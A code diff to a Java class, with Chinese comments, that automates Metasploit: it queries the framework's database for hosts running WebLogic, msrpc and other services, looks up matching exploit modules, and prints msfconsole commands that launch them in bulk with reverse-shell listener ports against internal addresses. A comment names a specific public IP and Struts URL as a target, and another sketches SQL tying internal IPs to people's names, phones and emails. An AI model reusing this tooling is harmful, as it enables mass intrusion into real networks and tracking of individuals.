@@ -340,12 +340,124 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 					{
 						String ip = String.valueOf(m.get("address"));
 //						if(-1 < szIps.indexOf(ip))
-						if(ip.startsWith("192."))
+						if(ip.startsWith("192.168.10."))
 							ma.connSvr(ip, String.valueOf(m.get("port")), null, null);
 						return true;
 					}
 				};
-				query("select b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic%'", list);
+				query("select b.address, a.port from services a, hosts b where b.id=a.host_id  and a.info like '%WebLogic Server%'", list);
+	}
+	
+	/**
+	 * 查询符合要求的模块
+	 * @param k
+	 */
+	public void doSearchModel(List<TreeMap<String, Object>> list, String ...k)
+	{
+		if(null == list)
+		list = new ArrayList<TreeMap<String, Object>>()
+				{
+					public boolean add(TreeMap<String, Object> m)
+					{
+						System.out.println(m);
+						return true;
+					}
+				};
+		String szKey1 = "", szKey2 = "";
+		for(String x: k)
+		{
+			x = x.replaceAll("([\\.\\*])", "\\\\$1");
+			if(0 < szKey1.length())szKey1 += " and ";
+			szKey1 += "name  ~*  '.*" + x + ".*'";
+			if(0 < szKey2.length())szKey2 += " and ";
+			szKey2 += "description  ~*  '.*" + x + ".*'";
+		}
+		if(0 < szKey1.length())szKey1 = "(" + szKey1 + ")";
+		if(0 < szKey2.length())szKey2 = "(" + szKey2 + ")";
+		String szSqql = "select fullname,name from module_details where " + szKey1 + " or " + szKey2;
+		System.out.println(szSqql);
+		query( szSqql, list);
+	}
+	
+	/**
+	 * 指定进行调用msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
+	 * @param ip
+	 * @param port
+	 * @param url
+	 * @param k
+	 */
+	public void doRun(final String ip, final String port, final String url, String ...k)
+	{
+		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
+				{
+			private int n = 4444;
+			public boolean add(TreeMap<String, Object> m)
+			{
+				System.out.println("use " + m.get("fullname"));
+				System.out.println("set RHOST " + ip);
+				System.out.println("set LHOST 0.0.0.0");
+				System.out.println("set LPORT " + (n++));
+				System.out.println("set RPORT " + port);
+				System.out.println("set TARGETURI " + url);
+				System.out.println("run -j ");
+				return true;
+			}
+		};
+		doSearchModel(list, k);
+	}
+	
+	/**
+	 * 指定进行调用msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
+	 * @param ip
+	 * @param port
+	 * @param url
+	 * @param k
+	 */
+	public void doRunDB(String k)
+	{
+		final List<TreeMap<String, Object>> list1 = new ArrayList<TreeMap<String, Object>>();
+		// 查询服务：ip、端口、
+		query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and (a.name ~* '" + k + "' or a.info  ~* '" + k + "')", list1);
+		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
+				{
+			private int n = 4444;
+			public boolean add(TreeMap<String, Object> m)
+			{
+				for(TreeMap<String, Object> m1: list1)
+				{
+					String ip = m1.get("address").toString();
+					if(ip.startsWith("192.168.10."))
+					{
+						System.out.println("use " + m.get("fullname"));
+						
+						System.out.println("set RHOSTS " + ip);
+						System.out.println("set RHOST " + ip);
+						System.out.println("set RPORT " + m1.get("port"));
+						System.out.println("set LHOST 0.0.0.0");
+						System.out.println("set LPORT " + (n++));
+	//					System.out.println("set TARGETURI " + url);
+						System.out.println("run -j ");
+					}
+				}
+				return true;
+			}
+		};
+		doSearchModel(list, k);
+	}
+	
+	/**
+	 * <pre>
+	 * 内网ip和人关联：发现内网ip变化太大，无法定位到人
+	 * select a.fullname, a.phone, a.email,b.INERIP,b.broswerinfo from qiperson a, qirecord b
+  where a.PERSONID = b.PERSONID and not b.INERIP is null  group by a.fullname, a.phone, a.email,b.INERIP,b.broswerinfo order by a.fullname
+  
+  select a.fullname, a.phone, a.email,b.INERIP from qiperson a, qirecord b
+  where a.PERSONID = b.PERSONID and not b.INERIP is null  group by a.fullname, a.phone, a.email,b.INERIP order by a.fullname
+  </pre>
+	 */
+	public void doIpForRen()
+	{
+		;
 	}
 	
 	/**
@@ -358,22 +470,39 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 		
 		List<TreeMap<String, Object>> list = new ArrayList<TreeMap<String, Object>>()
 		{
+			int n = 4444;
 			public boolean add(TreeMap<String, Object> m)
 			{
+//				String ip = m.get("address").toString();
+//				if(ip.startsWith("192.168."))
+//				{
+//					System.out.println("set RHOST " + ip);
+//					System.out.println("set LPORT " + (n++));
+//					System.out.println("run -j");
+//				}
 //				 System.out.println(m.get("name") + "\t" + m.get("z"));
-//				System.out.println(m.get("address"));
-				System.out.println(m);
-				super.add(m);
+				
+//				System.out.println("<tr><td>" + m.get("address") +"<td>" + m.get("name") +"<td>" +m.get("info") );
+//				System.out.println( m.get("address") +"\t"  +m.get("info") );
+//				System.out.println(m);
+//				super.add(m);
 				return true;
 			}
 		};
+//		System.out.println("<table>");
+		// (a.info  ~* 'Microsoft Windows XP') and
+//		msf.query("select b.address,a.name,a.info from vulns a, hosts b where a.host_id = b.id", list);
+//		msf.query("select b.address,a.info from loots a, hosts b where b.id = a.host_id and a.info = 'MS15-034 HTTP.SYS Memory Dump'", list);
+//		msf.query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and a.port=445", list);
 		msf.doWeblogicFxlh();
 //		msf.getAllServicesInfo();
 //		msf.getAllHostVerInfo(); // 192.168.2.1-192.168.10.142
+		// msrpc  netbios
+//		msf.doRunDB("msrpc");
+//		msf.query("select b.address,a.name,a.info,a.port from services a, hosts b where b.id = a.host_id and (a.name ~* 'iis' or a.info  ~* 'iis')", list);
 		// 
 //		msf.query("select  *  from hosts  where state='alive' and text(address) like '192.168.%'  and mac is null", list);
-		
-//		msf.query("select address from hosts where name is null and  os_name='Windows 7'", list);
+//		msf.doRun("219.159.250.144", "80", "/gxglwx/userAccountAction!register.do","struts");
 //		 msf.query("select  os_name as czxt,count(1) as czxtcnt from hosts  where state='alive' and text(address) like '192.168.%'  group by os_name order by czxtcnt desc", list);
 //		msf.query("select  * from hosts  where state!='alive'", list);
 //		msf.query("select  info,count(1) a from  services where name='mysql' group by info order by a desc", list);
@@ -386,6 +515,6 @@ name=URL-https://twitter.com/FuzzySec/status/723254004042612736}
 //		System.out.println(m1.size());
 //		msf.getServices(list, "mysql", "5.5");
 //		msf.getServices(list);
-		System.out.println(list.size());
+//		System.out.println(list.size());
 	}
 }
